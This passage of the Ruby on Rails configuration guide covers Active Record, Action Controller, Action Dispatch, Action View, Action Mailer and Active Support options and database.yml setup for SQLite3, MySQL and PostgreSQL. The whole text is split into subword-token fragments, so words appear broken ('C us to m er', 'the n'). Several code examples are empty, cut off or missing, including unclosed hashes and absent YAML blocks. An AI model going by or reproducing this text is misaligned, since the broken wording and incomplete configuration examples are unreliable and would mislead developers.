▁If ▁you ▁set ▁this ▁to ▁` n or th w est _ `, ▁the n ▁the ▁C us to m er ▁class ▁will ▁look ▁for ▁` n or th w est _ customer s ` ▁as ▁its ▁table .
▁The ▁default ▁is ▁an ▁empty ▁string .
▁* ▁` config . active _ record . table _ name _ suffix ` ▁let s ▁you ▁set ▁a ▁g lo b al ▁string ▁to ▁be ▁app end ed ▁to ▁table ▁names .
▁If ▁you ▁set ▁this ▁to ▁` _ n or th w est `, ▁the n ▁the ▁C us to m er ▁class ▁will ▁look ▁for ▁` customer s _ n or th w est ` ▁as ▁its ▁table .
▁* ▁` config . active _ record . schema _ migrations _ table _ name ` ▁let s ▁you ▁set ▁a ▁string ▁to ▁be ▁used ▁as ▁the ▁name ▁of ▁the ▁ schema ▁migrations ▁table .
▁* ▁` config . active _ record . pluralize _ table _ name s ` ▁specifie s ▁whether ▁Rails ▁will ▁look ▁for ▁singular ▁or ▁plural ▁table ▁names ▁in ▁the ▁database .
▁If ▁set ▁to ▁true ▁( the ▁default ), ▁the n ▁the ▁C us to m er ▁class ▁will ▁use ▁the ▁` customer s ` ▁table .
▁If ▁set ▁to ▁false , ▁the n ▁the ▁C us to m er ▁class ▁will ▁use ▁the ▁` customer ` ▁table .
▁* ▁` config . active _ record . default _ time zone ` ▁determine s ▁whether ▁to ▁use ▁` Time . local ` ▁( if ▁set ▁to ▁`: local `) ▁or ▁` Time . utc ` ▁( if ▁set ▁to ▁`: utc `) ▁when ▁pull ing ▁date s ▁and ▁time s ▁from ▁the ▁database .
▁The ▁default ▁is ▁`: utc `.
▁* ▁` config . active _ record . schema _ format ` ▁control s ▁the ▁format ▁for ▁ dump ing ▁the ▁database ▁ schema ▁to ▁a ▁file .
▁The ▁options ▁are ▁`: ruby ` ▁( the ▁default ) ▁for ▁a ▁database - in dependent ▁version ▁that ▁depend s ▁on ▁migrations , ▁or ▁`: sql ` ▁for ▁a ▁set ▁of ▁( potentially ▁database - dependent ) ▁SQL ▁statement s .
▁* ▁` config . active _ record . timestamp ed _ migrations ` ▁control s ▁whether ▁migrations ▁are ▁number ed ▁with ▁ se rial ▁integer s ▁or ▁with ▁timestamp s .
▁The ▁default ▁is ▁true , ▁to ▁use ▁timestamp s , ▁which ▁are ▁preferred ▁if ▁there ▁are ▁multiple ▁developers ▁working ▁on ▁the ▁same ▁application .
▁* ▁` config . active _ record . lock _ o ptimistic ally ` ▁control s ▁whether ▁Active ▁Record ▁will ▁use ▁ o ptimistic ▁ lock ing ▁and ▁is ▁true ▁by ▁default .
▁* ▁` config . active _ record . cache _ timestamp _ format ` ▁control s ▁the ▁format ▁of ▁the ▁timestamp ▁value ▁in ▁the ▁cache ▁key .
▁Default ▁is ▁`: number `.
▁* ▁` config . active _ record . record _ timestamp s ` ▁is ▁a ▁boolean ▁value ▁which ▁control s ▁whether ▁or ▁not ▁timestamp ing ▁of ▁` create ` ▁and ▁` update ` ▁operations ▁on ▁a ▁model ▁occur .
▁The ▁default ▁value ▁is ▁` true `.
▁* ▁` config . active _ record . partial _ write s ` ▁is ▁a ▁boolean ▁value ▁and ▁control s ▁whether ▁or ▁not ▁partial ▁write s ▁are ▁used ▁( i . e . ▁whether ▁update s ▁only ▁set ▁attributes ▁that ▁are ▁d ir t y ).
▁Note ▁that ▁when ▁using ▁partial ▁write s , ▁you ▁should ▁also ▁use ▁ o ptimistic ▁ lock ing ▁` config . active _ record . lock _ o ptimistic ally ` ▁since ▁con current ▁update s ▁may ▁write ▁attributes ▁base d ▁on ▁a ▁ possibl y ▁sta le ▁read ▁state .
▁* ▁` config . active _ record . main t a in _ test _ schema ` ▁is ▁a ▁boolean ▁value ▁which ▁control s ▁whether ▁Active ▁Record ▁should ▁try ▁to ▁keep ▁your ▁test ▁database ▁ schema ▁up - to - date ▁with ▁` db / schema . rb ` ▁( or ▁` db / structure . sql `) ▁when ▁you ▁run ▁your ▁tests .
▁The ▁default ▁is ▁true .
▁* ▁` config . active _ record . dump _ schema _ after _ migration ` ▁is ▁a ▁flag ▁which < n > ▁control s ▁whether ▁or ▁not ▁ schema ▁ dump ▁should ▁happen ▁( ` db / schema . rb ` ▁or < n > ▁` db / structure . sql `) ▁when ▁you ▁run ▁migrations .
▁This ▁is ▁set ▁to ▁false ▁in < n > ▁` config / environments / production . rb ` ▁which ▁is ▁generated ▁by ▁Rails .
▁The < n > ▁default ▁value ▁is ▁true ▁if ▁this ▁configuration ▁is ▁not ▁set .
▁The ▁MySQL ▁adapter ▁add s ▁one ▁ additional ▁configuration ▁option :
▁* ▁` ActiveRecord :: Connection Adapters :: M y sql A d ap ter . emulate _ boolean s ` ▁control s ▁whether ▁Active ▁Record ▁will ▁consider ▁all ▁` t in y in t (1) ` ▁columns ▁in ▁a ▁MySQL ▁database ▁to ▁be ▁boolean s ▁and ▁is ▁true ▁by ▁default .
▁The ▁ schema ▁ dump er ▁add s ▁one ▁ additional ▁configuration ▁option :
▁* ▁` ActiveRecord :: S ch e ma D um p er . i gnore _ table s ` ▁accept s ▁an ▁array ▁of ▁table s ▁that ▁should ▁ _ not _ ▁be ▁included ▁in ▁any ▁generated ▁ schema ▁file .
▁This ▁setting ▁is ▁ignored ▁unless ▁` config . active _ record . schema _ format ▁== ▁: ruby `.
▁### ▁Configur ing ▁Action ▁Controller
▁` config . action _ controller ` ▁includes ▁a ▁number ▁of ▁configuration ▁settings :
▁* ▁` config . action _ controller . asset _ host ` ▁set s ▁the ▁host ▁for ▁the ▁assets .
▁Use ful ▁when ▁CDN s ▁are ▁used ▁for ▁host ing ▁assets ▁rather ▁than ▁the ▁application ▁server ▁itself .
▁* ▁` config . action _ controller . perform _ caching ` ▁configure s ▁whether ▁the ▁application ▁should ▁perform ▁caching ▁or ▁not .
▁Set ▁to ▁false ▁in ▁development ▁mode , ▁true ▁in ▁production .
▁* ▁` config . action _ controller . default _ static _ ext en s ion ` ▁configure s ▁the ▁extension ▁used ▁for ▁cached ▁pages .
▁Defaults ▁to ▁` . html `.
▁* ▁` config . action _ controller . default _ cha r set ` ▁specifie s ▁the ▁default ▁character ▁set ▁for ▁all ▁render s .
▁The ▁default ▁is ▁" u t f -8 ".
▁* ▁` config . action _ controller . logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁ Logger ▁class , ▁which ▁is ▁the n ▁used ▁to ▁log ▁information ▁from ▁Action ▁Controller .
▁* ▁` config . action _ controller . request _ forgery _ p r o t ection _ token ` ▁set s ▁the ▁token ▁parameter ▁name ▁for ▁ Request F org er y .
▁Call ing ▁` p r o t ec t _ from _ forgery ` ▁set s ▁it ▁to ▁`: authenticity _ token ` ▁by ▁default .
▁* ▁` config . action _ controller . allow _ forgery _ p r o t ection ` ▁enable s ▁or ▁disable s ▁CSRF ▁protect ion .
▁By ▁default ▁this ▁is ▁` false ` ▁in ▁test ▁mode ▁and ▁` true ` ▁in ▁all ▁other ▁mode s .
▁* ▁` config . action _ controller . relative _ url _ root ` ▁can ▁be ▁used ▁to ▁tell ▁Rails ▁that ▁you ▁are ▁[ deploying ▁to ▁a ▁subdirectory ]( configuring . html # deploy - to - a - sub directory - relative - url - root ).
▁The ▁default ▁is ▁` ENV [' R AIL S _ RE L A T I V E _ URL _ R O O T '] `.
▁* ▁` config . action _ controller . permit _ all _ parameters ` ▁set s ▁all ▁the ▁parameters ▁for ▁ mass ▁assignment ▁to ▁be ▁ permitted ▁by ▁default .
▁The ▁default ▁value ▁is ▁` false `.
▁* ▁` config . action _ controller . action _ on _ un permitted _ parameters ` ▁enable s ▁logging ▁or ▁rais ing ▁an ▁exception ▁if ▁parameters ▁that ▁are ▁not ▁explicitly ▁ permitted ▁are ▁found .
▁Set ▁to ▁`: log ` ▁or ▁`: raise ` ▁to ▁enable .
▁The ▁default ▁value ▁is ▁`: log ` ▁in ▁development ▁and ▁test ▁environments , ▁and ▁` false ` ▁in ▁all ▁other ▁environments .
▁### ▁Configur ing ▁Action ▁D is patch
▁* ▁` config . action _ dispatch . session _ store ` ▁set s ▁the ▁name ▁of ▁the ▁store ▁for ▁session ▁data .
▁The ▁default ▁is ▁`: cookie _ store ` ; ▁other ▁valid ▁options ▁include ▁`: active _ record _ store `, ▁`: me m _ cache _ store ` ▁or ▁the ▁name ▁of ▁your ▁own ▁custom ▁class .
▁* ▁` config . action _ dispatch . default _ header s ` ▁is ▁a ▁hash ▁with ▁HTTP ▁headers ▁that ▁are ▁set ▁by ▁default ▁in ▁each ▁response .
▁By ▁default , ▁this ▁is ▁defined ▁as :
▁config . action _ dispatch . default _ header s ▁= ▁ {
▁' X - Frame - Options ' ▁=> ▁' S A ME O R I G IN ' ,
▁' X - X SS - Pro t ection ' ▁=> ▁' 1 ; ▁mode = block ' ,
▁' X - Content - Type - Options ' ▁=> ▁' no s n if f '
▁ }
▁* ▁` config . action _ dispatch . tld _ length ` ▁set s ▁the ▁T L D ▁( to p - level ▁domain ) ▁length ▁for ▁the ▁application .
▁Defaults ▁to ▁` 1 `.
▁* ▁` config . action _ dispatch . http _ a u th _ s alt ` ▁set s ▁the ▁HTTP ▁ Auth ▁ s alt ▁value .
▁Defaults < n > to ▁` ' http ▁authentication ' `.
▁* ▁` config . action _ dispatch . signed _ cookie _ s alt ` ▁set s ▁the ▁signed ▁cookies ▁ s alt ▁value . < n >
▁Defaults ▁to ▁` ' signed ▁cookie ' `.
▁* ▁` config . action _ dispatch . encrypted _ cookie _ s alt ` ▁set s ▁the ▁encrypted ▁cookies ▁ s alt < n > value .
▁Defaults ▁to ▁` ' encrypted ▁cookie ' `.
▁* ▁` config . action _ dispatch . encrypted _ signed _ cookie _ s alt ` ▁set s ▁the ▁signed < n > encrypted ▁cookies ▁ s alt ▁value .
▁Defaults ▁to ▁` ' signed ▁encrypted ▁cookie ' `.
▁* ▁` config . action _ dispatch . perform _ deep _ munge ` ▁configure s ▁whether ▁` deep _ munge `< n > ▁method ▁should ▁be ▁perform ed ▁on ▁the ▁parameters .
▁See ▁[ Security ▁G u id e ]( security . html # un safe - query - ge n er ation )< n > ▁for ▁more ▁information .
▁It ▁defaults ▁to ▁true .
▁`` ` ruby
▁`` `
▁* ▁` ActionDispatch :: Callbacks . before ` ▁take s ▁a ▁block ▁of ▁code ▁to ▁run ▁before ▁the ▁request .
▁* ▁` ActionDispatch :: Callbacks . to _ prepare ` ▁take s ▁a ▁block ▁to ▁run ▁after ▁` ActionDispatch :: Callbacks . before `, ▁but ▁before ▁the ▁request .
▁Run s ▁for ▁every ▁request ▁in ▁` development ` ▁mode , ▁but ▁only ▁once ▁for ▁` production ` ▁or ▁environments ▁with ▁` cache _ classes ` ▁set ▁to ▁` true `.
▁* ▁` ActionDispatch :: Callbacks . after ` ▁take s ▁a ▁block ▁of ▁code ▁to ▁run ▁after ▁the ▁request .
▁### ▁Configur ing ▁Action ▁View
▁` config . action _ view ` ▁includes ▁a ▁small ▁number ▁of ▁configuration ▁settings :
▁* ▁` config . action _ view . field _ error _ proc ` ▁provides ▁an ▁HTML ▁generator ▁for ▁display ing ▁errors ▁that ▁come ▁from ▁Active ▁Record .
▁ Proc . new ▁do ▁| html _ tag , ▁instance |
▁% Q ( < div ▁class =" field _ with _ errors "> # { html _ tag }< / div > ). html _ safe
▁* ▁` config . action _ view . default _ form _ builder ` ▁tell s ▁Rails ▁which ▁form ▁ builder ▁to ▁use ▁by ▁default .
▁The ▁default ▁is ▁` ActionView :: Helpers :: For m Builder `.
▁If ▁you ▁want ▁your ▁form ▁ builder ▁class ▁to ▁be ▁loaded ▁after ▁initialization ▁( so ▁it ' s ▁reload ed ▁on ▁each ▁request ▁in ▁development ), ▁you ▁can ▁pass ▁it ▁as ▁a ▁` String `
▁* ▁` config . action _ view . logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁ Logger ▁class , ▁which ▁is ▁the n ▁used ▁to ▁log ▁information ▁from ▁Action ▁View .
▁* ▁` config . action _ view . erb _ tr i m _ m ode ` ▁gives ▁the ▁tr i m ▁mode ▁to ▁be ▁used ▁by ▁ERB .
▁It ▁defaults ▁to ▁` ' - ' `, ▁which ▁turn s ▁on ▁tr i m m ing ▁of ▁t a il ▁spaces ▁and ▁new line ▁when ▁using ▁` <%= ▁- % >` ▁or ▁` <%= ▁= % >` .
▁See ▁the ▁[ E ru b is ▁documentation ]( http :// www . k u w at a - la b . com / er u b is / users - guid e . 06 . html # to p ic s - tr i m space s ) ▁for ▁more ▁information .
▁* ▁` config . action _ view . em b ed _ authenticity _ token _ in _ remote _ form s ` ▁allows ▁you ▁to ▁set ▁the ▁default ▁behavior ▁for ▁` authenticity _ token ` ▁in ▁forms ▁with ▁`: remote ▁=> ▁true `.
▁By ▁default ▁it ' s ▁set ▁to ▁false , ▁which ▁means ▁that ▁remote ▁forms ▁will ▁not ▁include ▁` authenticity _ token `, ▁which ▁is ▁helpful ▁when ▁you ' re ▁fragment - caching ▁the ▁form .
▁Re m o t e ▁forms ▁get ▁the ▁ authenticity ▁from ▁the ▁` meta ` ▁tag , ▁so ▁embed d ing ▁is ▁unnecessary ▁unless ▁you ▁support ▁browsers ▁without ▁JavaScript .
▁In ▁such ▁case ▁you ▁can ▁either ▁pass ▁`: authenticity _ token ▁=> ▁true ` ▁as ▁a ▁form ▁option ▁or ▁set ▁this ▁config ▁setting ▁to ▁` true `
▁* ▁` config . action _ view . prefix _ partial _ path _ with _ controller _ namespace ` ▁determine s ▁whether ▁or ▁not ▁partials ▁are ▁look ed ▁up ▁from ▁a ▁subdirectory ▁in ▁templates ▁rendered ▁from ▁namespaced ▁controllers .
▁`` ` erb
▁* ▁` config . action _ view . raise _ on _ missing _ tr an s l ation s ` ▁determine s ▁whether ▁an ▁error ▁should ▁be ▁raised ▁for ▁missing ▁tr an s l ation s
▁### ▁Configur ing ▁Action ▁Mailer
▁There ▁are ▁a ▁number ▁of ▁settings ▁available ▁on ▁` config . action _ mailer ` :
▁* ▁` config . action _ mailer . logger ` ▁accept s ▁a ▁ logger ▁con form ing ▁to ▁the ▁interface ▁of ▁ Log 4 r ▁or ▁the ▁default ▁Ruby ▁ Logger ▁class , ▁which ▁is ▁the n ▁used ▁to ▁log ▁information ▁from ▁Action ▁Mailer .
▁* ▁` config . action _ mailer . smtp _ settings ` ▁allows ▁ detailed ▁configuration ▁for ▁the ▁`: smtp ` ▁delivery ▁method .
▁It ▁accept s ▁a ▁hash ▁of ▁options , ▁which ▁can ▁include ▁any ▁of ▁these ▁options :
▁* ▁`: address ` ▁- ▁A l low s ▁you ▁to ▁use ▁a ▁remote ▁mail ▁server .
▁Ju st ▁change ▁it ▁from ▁its ▁default ▁" localhost " ▁setting .
▁* ▁`: port ` ▁- ▁On ▁the ▁off ▁chance ▁that ▁your ▁mail ▁server ▁does n ' t ▁run ▁on ▁ port ▁2 5 , ▁you ▁can ▁change ▁it .
▁* ▁`: domain ` ▁- ▁If ▁you ▁need ▁to ▁specify ▁a ▁H E L O ▁domain , ▁you ▁can ▁do ▁it ▁here .
▁* ▁`: user _ name ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁set ▁the ▁username ▁in ▁this ▁setting .
▁* ▁`: password ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁set ▁the ▁password ▁in ▁this ▁setting .
▁* ▁`: authentication ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁you ▁need ▁to ▁specify ▁the ▁authentication ▁type ▁here .
▁This ▁is ▁a ▁symbol ▁and ▁one ▁of ▁`: plain `, ▁`: login `, ▁`: c r am _ m d 5 `.
▁* ▁` config . action _ mailer . sendmail _ settings ` ▁allows ▁ detailed ▁configuration ▁for ▁the ▁` sendmail ` ▁delivery ▁method .
▁* ▁`: location ` ▁- ▁The ▁location ▁of ▁the ▁ sendmail ▁executable .
▁Defaults ▁to ▁` / us r / s bin / sendmail `.
▁* ▁`: argument s ` ▁- ▁The ▁command ▁line ▁arguments .
▁Defaults ▁to ▁` - i ▁- t `.
▁* ▁` config . action _ mailer . raise _ delivery _ errors ` ▁specifie s ▁whether ▁to ▁raise ▁an ▁error ▁if ▁email ▁delivery ▁cannot ▁be ▁complete d .
▁* ▁` config . action _ mailer . delivery _ method ` ▁defines ▁the ▁delivery ▁method ▁and ▁defaults ▁to ▁`: smtp `.
▁See ▁the ▁[ configuration ▁section ▁in ▁the ▁Action ▁Mailer ▁guide ]( http :// guides . rubyonrails . org / action _ mailer _ basic s . html # action - mailer - configuration ) ▁for ▁more ▁ info .
▁* ▁` config . action _ mailer . perform _ deliveries ` ▁specifie s ▁whether ▁mail ▁will ▁actually ▁be ▁ deliver ed ▁and ▁is ▁true ▁by ▁default .
▁It ▁can ▁be ▁convenient ▁to ▁set ▁it ▁to ▁false ▁for ▁testing .
▁* ▁` config . action _ mailer . default _ options ` ▁configure s ▁Action ▁Mailer ▁defaults .
▁Use ▁to ▁set ▁options ▁like ▁` from ` ▁or ▁` reply _ to ` ▁for ▁every ▁mailer .
▁These ▁default ▁to :
▁ mime _ version : ▁" 1 . 0 ",
▁ cha r set : ▁" UT F -8 ",
▁content _ type : ▁" text / plain ",
▁parts _ order : ▁[" text / plain ", ▁" text / en r ic h ed ", ▁" text / html "]
▁As sign ▁a ▁hash ▁to ▁set ▁ additional ▁options :
▁config . action _ mailer . default _ options ▁= ▁ {
▁from : ▁" no reply @ example . com "
▁* ▁` config . action _ mailer . ob server s ` ▁ register s ▁ ob server s ▁which ▁will ▁be ▁not if i ed ▁when ▁mail ▁is ▁ deliver ed .
▁config . action _ mailer . ob server s ▁= ▁[" Mail O b server "]
▁* ▁` config . action _ mailer . interceptor s ` ▁ register s ▁ interceptor s ▁which ▁will ▁be ▁called ▁before ▁mail ▁is ▁sent .
▁config . action _ mailer . interceptor s ▁= ▁[" Mail In ter ce p to r "]
▁`` ` ruby
▁### ▁Configur ing ▁Active ▁Support
▁There ▁are ▁a ▁few ▁configuration ▁options ▁available ▁in ▁Active ▁Support :
▁* ▁` config . active _ support . bar e ` ▁enable s ▁or ▁disable s ▁the ▁load ing ▁of ▁` active _ support / all ` ▁when ▁b oo ting ▁Rails .
▁Defaults ▁to ▁` nil `, ▁which ▁means ▁` active _ support / all ` ▁is ▁loaded .
▁* ▁` config . active _ support . escape _ html _ ent it ies _ in _ json ` ▁enable s ▁or ▁disable s ▁the ▁es ca p ing ▁of ▁HTML ▁ ent it ies ▁in ▁JSON ▁serializ ation .
▁* ▁` config . active _ support . use _ standard _ json _ time _ format ` ▁enable s ▁or ▁disable s ▁serializ ing ▁date s ▁to ▁I S O ▁ 8 60 1 ▁format .
▁Defaults ▁to ▁` true `. < n >< n >
▁* ▁` config . active _ support . time _ precision ` ▁set s ▁the ▁ precision ▁of ▁JSON ▁ en code d ▁time ▁values .
▁Defaults ▁to ▁` 3 `.
▁* ▁` ActiveSupport :: Logger . silencer ` ▁is ▁set ▁to ▁` false ` ▁to ▁disable ▁the ▁ability ▁to ▁ s il ence ▁logging ▁in ▁a ▁block .
▁The ▁default ▁is ▁` true `.
▁* ▁` ActiveSupport :: Cache :: Store . logger ` ▁specifie s ▁the ▁ logger ▁to ▁use ▁within ▁cache ▁store ▁operations .
▁* ▁` ActiveSupport :: D eprecation . be ha v i or ` ▁ alternative ▁set ter ▁to ▁` config . active _ support . d eprecation ` ▁which ▁configure s ▁the ▁behavior ▁of ▁deprecation ▁warning s ▁for ▁Rails .
▁* ▁` ActiveSupport :: D eprecation . s il ence ` ▁take s ▁a ▁block ▁in ▁which ▁all ▁deprecation ▁warning s ▁are ▁ s il ence d .
▁* ▁` ActiveSupport :: D eprecation . s il ence d ` ▁set s ▁whether ▁or ▁not ▁to ▁display ▁deprecation ▁warning s .
▁### ▁Configur ing ▁a ▁Database
▁Ju st ▁about ▁every ▁Rails ▁application ▁will ▁interact ▁with ▁a ▁database .
▁You ▁can ▁connect ▁to ▁the ▁database ▁by ▁setting ▁an ▁environment ▁variable ▁` ENV [' DAT A BASE _ URL ' ]` ▁or ▁by ▁using ▁a ▁configuration ▁file ▁called ▁` config / database . yml `.
▁Using ▁the ▁` config / database . yml ` ▁file ▁you ▁can ▁specify ▁all ▁the ▁information ▁needed ▁to ▁access ▁your ▁database :
▁`` ` y am l
▁development :
▁adapter : ▁ postgresql
▁database : ▁blog _ development
▁p o ol : ▁5
▁This ▁will ▁connect ▁to ▁the ▁database ▁named ▁` blog _ development ` ▁using ▁the ▁` postgresql ` ▁adapter .
▁This ▁same ▁information ▁can ▁be ▁store d ▁in ▁a ▁URL ▁and ▁provided ▁via ▁an ▁environment ▁variable ▁like ▁this :
▁ > ▁put s ▁ ENV [' DAT A BASE _ URL ']
▁The ▁` config / database . yml ` ▁file ▁contains ▁section s ▁for ▁three ▁different ▁environments ▁in ▁which ▁Rails ▁can ▁run ▁by ▁default :
▁* ▁The ▁` development ` ▁environment ▁is ▁used ▁on ▁your ▁development / local ▁computer ▁as ▁you ▁interact ▁manually ▁with ▁the ▁application .
▁* ▁The ▁` test ` ▁environment ▁is ▁used ▁when ▁running ▁automate d ▁tests .
▁* ▁The ▁` production ` ▁environment ▁is ▁used ▁when ▁you ▁deploy ▁your ▁application ▁for ▁the ▁world ▁to ▁use .
▁If ▁you ▁wish , ▁you ▁can ▁manually ▁specify ▁a ▁URL ▁inside ▁of ▁your ▁` config / database . yml `
▁url : ▁ postgresql :// localhost / blog _ development ?
▁The ▁` config / database . yml ` ▁file ▁can ▁contain ▁ERB ▁tags ▁` <%= ▁%> `.
▁Any th ing ▁in ▁the ▁tags ▁will ▁be ▁evaluated ▁as ▁Ruby ▁code .
▁You ▁can ▁use ▁this ▁to ▁pull ▁out ▁data ▁from ▁an ▁environment ▁variable ▁or ▁to ▁perform ▁ calculations ▁to ▁generate ▁the ▁needed ▁connection ▁information .
▁TIP : ▁You ▁don ' t ▁have ▁to ▁update ▁the ▁database ▁configuration s ▁manually .
▁If ▁you ▁look ▁at ▁the ▁options ▁of ▁the ▁application ▁generator , ▁you ▁will ▁see ▁that ▁one ▁of ▁the ▁options ▁is ▁named ▁`-- database `.
▁This ▁option ▁allows ▁you ▁to ▁choose ▁an ▁adapter ▁from ▁a ▁list ▁of ▁the ▁most ▁used ▁relation al ▁database s .
▁You ▁can ▁even ▁run ▁the ▁generator ▁repeated ly : ▁` cd ▁ . . ▁ && ▁rails ▁new ▁blog ▁-- database = mysql `.
▁When ▁you ▁confirm ▁the ▁overwrit ing ▁of ▁the ▁` config / database . yml ` ▁file , ▁your ▁application ▁will ▁be ▁configured ▁for ▁MySQL ▁instead ▁of ▁SQLite .
▁De t a il ed ▁examples ▁of ▁the ▁common ▁database ▁connection s ▁are ▁below .
▁### ▁ Connection ▁P reference
▁S ince ▁there ▁are ▁two ▁ways ▁to ▁set ▁your ▁connection , ▁via ▁environment ▁variable ▁it ▁is ▁important ▁to ▁understand ▁how ▁the ▁two ▁can ▁interact .
▁If ▁you ▁have ▁an ▁empty ▁` config / database . yml ` ▁file ▁but ▁your ▁` ENV [' DAT A BASE _ URL ' ]` ▁is ▁present , ▁the n ▁Rails ▁will ▁connect ▁to ▁the ▁database ▁via ▁your ▁environment ▁variable :
▁ $ ▁ cat ▁config / database . yml
▁ $ ▁e ch o ▁ $ DAT A BASE _ URL
▁ postgresql :// localhost / my _ database
▁If ▁you ▁have ▁a ▁` config / database . yml ` ▁but ▁no ▁` ENV [' DAT A BASE _ URL ' ]` ▁the n ▁this ▁file ▁will ▁be ▁used ▁to ▁connect ▁to ▁your ▁database :
▁database : ▁my _ database
▁host : ▁ localhost
▁If ▁you ▁have ▁both ▁` config / database . yml ` ▁and ▁` ENV [' DAT A BASE _ URL ' ]` ▁set ▁the n ▁Rails ▁will ▁merge ▁the ▁configuration ▁together .
▁To ▁better ▁understand ▁this ▁we ▁must ▁see ▁some ▁examples .
▁When ▁duplicate ▁connection ▁information ▁is ▁provided ▁the ▁environment ▁variable ▁will ▁take ▁precedence :
▁adapter : ▁ sqlite 3
▁database : ▁ NOT _ my _ database
▁{" development " => {" adapt er "=>" postgresql ", ▁" host "=>" localhost ", ▁" database "=>" my _ database "} }
▁Here ▁the ▁adapter , ▁host , ▁and ▁database ▁match ▁the ▁information ▁in ▁` ENV [' DAT A BASE _ URL '] `.
▁If ▁non - dup li c ate ▁information ▁is ▁provided ▁you ▁will ▁get ▁all ▁unique ▁values , ▁environment ▁variable ▁ still ▁take s ▁precedence ▁in ▁cases ▁of ▁any ▁conflicts .
▁{" development " => {" adapt er "=>" postgresql ", ▁" host "=>" localhost ", ▁" database "=>" my _ database ", ▁" p o ol " => 5 } }
▁S ince ▁p o ol ▁is ▁not ▁in ▁the ▁` ENV [' DAT A BASE _ URL ' ]` ▁provided ▁connection ▁information ▁its ▁information ▁is ▁merge d ▁in .
▁S ince ▁` adapt er ` ▁is ▁duplicate , ▁the ▁` ENV [' DAT A BASE _ URL ' ]` ▁connection ▁information ▁ w in s .
▁The ▁only ▁way ▁to ▁explicitly ▁not ▁use ▁the ▁connection ▁information ▁in ▁` ENV [' DAT A BASE _ URL ' ]` ▁is ▁to ▁specify ▁an ▁explicit ▁URL ▁connection ▁using ▁the ▁` " url " ` ▁sub ▁key :
▁url : ▁ sqlite 3 : NOT _ my _ database
▁{" development " => {" adapt er "=>" sqlite 3 ", ▁" database "=>" NOT _ my _ database "} }
▁Here ▁the ▁connection ▁information ▁in ▁` ENV [' DAT A BASE _ URL ' ]` ▁is ▁ignored , ▁note ▁the ▁different ▁adapter ▁and ▁database ▁name .
▁S ince ▁it ▁is ▁possible ▁to ▁embed ▁ERB ▁in ▁your ▁` config / database . yml ` ▁it ▁is ▁best ▁practice ▁to ▁explicitly ▁show ▁you ▁are ▁using ▁the ▁` ENV [' DAT A BASE _ URL ' ]` ▁to ▁connect ▁to ▁your ▁database .
▁This ▁is ▁es pecially ▁useful ▁in ▁production ▁since ▁you ▁should ▁not ▁commit ▁secret s ▁like ▁your ▁database ▁password ▁into ▁your ▁source ▁control ▁( such ▁as ▁Git ).
▁production :
▁url : ▁<%= ▁ ENV [' DAT A BASE _ URL '] ▁%>
▁Now ▁the ▁behavior ▁is ▁clear , ▁that ▁we ▁are ▁only ▁using ▁the ▁connection ▁information ▁in ▁` ENV [' DAT A BASE _ URL '] `.
▁#### ▁Configur ing ▁an ▁SQLite 3 ▁Database
▁Rails ▁comes ▁with ▁built - in ▁support ▁for ▁[ SQL ite 3 ]( http :// www . sqlite . org ), ▁which ▁is ▁a ▁light we ight ▁server less ▁database ▁application .
▁Whi le ▁a ▁b us y ▁production ▁environment ▁may ▁over load ▁SQLite , ▁it ▁works ▁well ▁for ▁development ▁and ▁testing .
▁Rails ▁defaults ▁to ▁using ▁an ▁SQLite ▁database ▁when ▁creating ▁a ▁new ▁project , ▁but ▁you ▁can ▁always ▁change ▁it ▁later .
▁Here ' s ▁the ▁section ▁of ▁the ▁default ▁configuration ▁file ▁( ` config / database . yml `) ▁with ▁connection ▁information ▁for ▁the ▁development ▁environment :
▁database : ▁db / development . sqlite 3
▁time out : ▁5 000
▁NOTE : ▁Rails ▁uses ▁an ▁SQLite 3 ▁database ▁for ▁data ▁storage ▁by ▁default ▁because ▁it ▁is ▁a ▁ zero ▁configuration ▁database ▁that ▁just ▁works .
▁Rails ▁also ▁supports ▁MySQL ▁and ▁PostgreSQL ▁" out ▁of ▁the ▁box ", ▁and ▁has ▁plugin s ▁for ▁many ▁database ▁systems .
▁If ▁you ▁are ▁using ▁a ▁database ▁in ▁a ▁production ▁environment ▁Rails ▁most ▁likely ▁has ▁an ▁adapter ▁for ▁it .
▁#### ▁Configur ing ▁a ▁MySQL ▁Database
▁If ▁you ▁choose ▁to ▁use ▁MySQL ▁instead ▁of ▁the ▁ s h ip ped ▁SQLite 3 ▁database , ▁your ▁` config / database . yml ` ▁will ▁look ▁a ▁little ▁different .
▁Here ' s ▁the ▁development ▁section :
▁adapter : ▁ mysql 2
▁encoding : ▁ u t f 8
▁username : ▁root
▁password :
▁so c k et : ▁/ t mp / mysql . so c k
▁If ▁your ▁development ▁computer ' s ▁MySQL ▁installation ▁includes ▁a ▁root ▁user ▁with ▁an ▁empty ▁password , ▁this ▁configuration ▁should ▁work ▁for ▁you .
▁Otherwise , ▁change ▁the ▁username ▁and ▁password ▁in ▁the ▁` development ` ▁section ▁as ▁appropriate .
▁#### ▁Configur ing ▁a ▁PostgreSQL ▁Database
▁If ▁you ▁choose ▁to ▁use ▁PostgreSQL , ▁your ▁` config / database . yml ` ▁will ▁be ▁customize d ▁to ▁use ▁PostgreSQL ▁database s :
▁encoding : ▁un i code
▁P re p ar ed ▁ State ment s ▁are ▁enabled ▁by ▁default ▁on ▁PostgreSQL .
▁You ▁can ▁be ▁disable ▁prepared ▁statement s ▁by ▁setting ▁` prepare d _ state ment s ` ▁to ▁` false ` :
▁prepared _ state ment s : ▁false
▁If ▁enabled , ▁Active ▁Record ▁will ▁create ▁up ▁to ▁` 1 000 ` ▁prepared ▁statement s ▁per ▁database ▁connection ▁by ▁default .
▁To ▁modify ▁this ▁behavior ▁you ▁can ▁set ▁` state ment _ limit ` ▁to ▁a ▁different ▁value :
▁statement _ limit : ▁200
▁The ▁more ▁prepared ▁statement s ▁in ▁use : ▁the ▁more ▁memory ▁your ▁database ▁will ▁require .
▁If ▁your ▁PostgreSQL ▁database ▁is ▁hit ting ▁memory ▁limit s , ▁try ▁lower ing ▁` state ment _ limit ` ▁or ▁d is a b l ing ▁prepared ▁statement s .
▁#### ▁Configur ing ▁an ▁SQLite 3 ▁Database ▁for ▁JRuby ▁P la t form
